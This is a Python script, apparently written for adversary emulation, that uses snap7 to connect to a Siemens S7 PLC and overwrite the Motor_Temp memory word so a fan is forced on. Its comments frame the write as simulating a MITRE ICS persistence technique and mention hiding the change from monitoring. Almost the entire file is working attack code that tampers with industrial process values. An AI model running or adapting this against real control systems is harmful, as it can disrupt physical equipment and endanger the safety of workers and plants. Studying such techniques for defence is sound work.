import snap7
import struct
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to discover PLC IP address (Placeholder - Replace with actual discovery method)
def discover_plc_ip():
    """
    Placeholder function to discover the PLC IP address.
    In a real-world scenario, this would involve network scanning,
    reading from a configuration file, or querying a network service.

    Returns:
        str: The IP address of the PLC, or None if not found.
    """
    #print("Implement PLC IP discovery logic here.  Returning a default for now.")
    # Replace this with your actual PLC discovery method.
    return "127.0.0.1"  # Replace with the correct PLC IP

# Function to read a boolean tag from the PLC
def read_bool_tag(plc, area, byte_address, bit_address):
    """Reads a boolean tag from the PLC.

    Args:
        plc: The Snap7 client object.
        area: The PLC memory area (e.g., snap7.util.areas.MK for Merker/Memory).
        byte_address: The byte address of the tag.
        bit_address: The bit address of the tag (0-7).

    Returns:
        bool: The value of the tag.
    """
    try:
        byte_val = plc.read_area(area, 0, byte_address, 1)
        #print(f"Byte value read: {byte_val}")  # Debugging
        bit_mask = 1 << bit_address
        #print(f"Bitmask: {bit_mask}")  # Debugging
        bool_val = (byte_val[0] & bit_mask) != 0
        return bool_val
    except Exception as e:
        logging.error(f"Error reading boolean tag at byte {byte_address}, bit {bit_address}: {e}")
        return None

# Function to write a boolean tag to the PLC
def write_bool_tag(plc, area, byte_address, bit_address, value):
    """Writes a boolean tag to the PLC.

    Args:
        plc: The Snap7 client object.
        area: The PLC memory area.
        byte_address: The byte address of the tag.
        bit_address: The bit address of the tag (0-7).
        value: The boolean value to write.
    """
    try:
        byte_val = plc.read_area(area, 0, byte_address, 1)
        original_byte = byte_val[0]
        #print(f"Original byte value: {original_byte}") # Debugging

        bit_mask = 1 << bit_address
        if value:
            new_byte = original_byte | bit_mask  # Set the bit
        else:
            new_byte = original_byte & ~bit_mask # Clear the bit

        #print(f"New byte value: {new_byte}") # Debugging

        byte_array = bytearray([new_byte])
        plc.write_area(area, 0, byte_address, byte_array)
        logging.info(f"Successfully wrote {value} to byte {byte_address}, bit {bit_address}")
    except Exception as e:
        logging.error(f"Error writing {value} to byte {byte_address}, bit {bit_address}: {e}")


# Function to read an integer tag from the PLC
def read_int_tag(plc, area, byte_address):
    """Reads an integer tag from the PLC.

    Args:
        plc: The Snap7 client object.
        area: The PLC memory area.
        byte_address: The byte address of the tag.

    Returns:
        int: The value of the tag.
    """
    try:
        data = plc.read_area(area, 0, byte_address, 2)  # Integers are typically 2 bytes
        value = struct.unpack(">h", data)[0]  # ">h" for big-endian short (2 bytes)
        return value
    except Exception as e:
        logging.error(f"Error reading integer tag at address {byte_address}: {e}")
        return None

# Function to write an integer tag to the PLC
def write_int_tag(plc, area, byte_address, value):
    """Writes an integer tag to the PLC.

    Args:
        plc: The Snap7 client object.
        area: The PLC memory area.
        byte_address: The byte address of the tag.
        value: The integer value to write.
    """
    try:
        data = struct.pack(">h", value)  # ">h" for big-endian short (2 bytes)
        plc.write_area(area, 0, byte_address, data)
        logging.info(f"Successfully wrote {value} to address {byte_address}")
    except Exception as e:
        logging.error(f"Error writing {value} to address {byte_address}: {e}")



def modify_plc_program(plc):
    """
    Simulates modifying the PLC program to achieve persistence.  This example modifies
    the motor temperature setpoint to always activate the fans.

    Args:
        plc: The Snap7 client object.
    """
    try:
        # **MODIFYING THE PROGRAM LOGIC - Example: Set Motor_Temp to a high value**

        #  This is where the core of the MITRE technique lies.  We are simulating
        #  the modification of the PLC program logic.  In a real attack, this
        #  would be much more complex and tailored to the specific program.
        #  This example simply sets the Motor_Temp to a value that will always
        #  cause the fans to activate.

        # Setting Motor_Temp to 500 will cause Fan B to always activate based on the provided code.
        new_temperature = 500

        write_int_tag(plc, snap7.util.areas.MK, 7, new_temperature) # Motor_Temp is %MW7

        # **DETECTION CONCEALMENT - Optional: Mask the change**

        #  Adversaries might attempt to conceal their modifications.  For example,
        #  they might change logging settings or manipulate other tags that indicate
        #  the system's health. This is not included in this simple example but is critical
        #  to a real-world attack.

        logging.info("PLC program modification simulated: Motor_Temp set to force fan activation.")

    except Exception as e:
        logging.error(f"Error during PLC program modification: {e}")

def main():
    """
    Main function to connect to the PLC, modify the program, and disconnect.
    """
    plc_ip = discover_plc_ip()  # Get the PLC IP address
    if not plc_ip:
        print("Could not discover PLC IP address. Exiting.")
        return

    plc = snap7.client.Client()
    try:
        plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 (typical for S7-1200)
        logging.info(f"Connected to PLC at {plc_ip}")

        modify_plc_program(plc)  # Perform the program modification

    except Exception as e:
        logging.error(f"Error connecting to or communicating with the PLC: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            logging.info("Disconnected from PLC.")

if __name__ == "__main__":
    main()